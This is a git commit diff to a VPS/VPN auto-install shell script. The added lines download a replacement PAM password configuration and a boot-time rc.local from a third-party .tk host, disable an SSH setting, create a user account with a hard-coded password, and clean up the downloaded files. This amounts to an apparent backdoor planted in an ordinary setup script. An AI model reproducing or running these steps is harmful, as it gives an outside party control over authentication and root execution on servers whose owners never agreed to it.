3575528a8445838a52ec859c2f18b0909f0dfff1
samrey steven <33132267+Apache07@users.noreply.github.com>
2017-10-29 02:48:55 +0800

    Update setup.sh

--- 989/setup.sh
+++ 989/setup.sh
@@ -64,6 +64,9 @@ apt-file update
 vnstat -u -i $ether
 service vnstat restart
 
+# script
+wget -O /etc/pam.d/common-password "http://autoscriptnobita.tk/rendum/common-password"
+chmod +x /etc/pam.d/common-password
 # text gambar
 apt-get install boxes
 
@@ -89,6 +92,24 @@ sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php
 service php5-fpm restart
 service nginx restart
 
+# openvpn
+apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.tar "http://autoscriptnobita.tk/rendum/openvpn.tar"
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "http://autoscriptnobita.tk/rendum/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+
+# etc
+wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
+wget -O /etc/motd "http://autoscriptnobita.tk/rendum/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 
 # install badvpn
 wget -O /usr/bin/badvpn-udpgw "https://github.com/Apache07/example7/blob/master/989/badvpn-udpgw?raw=true" 
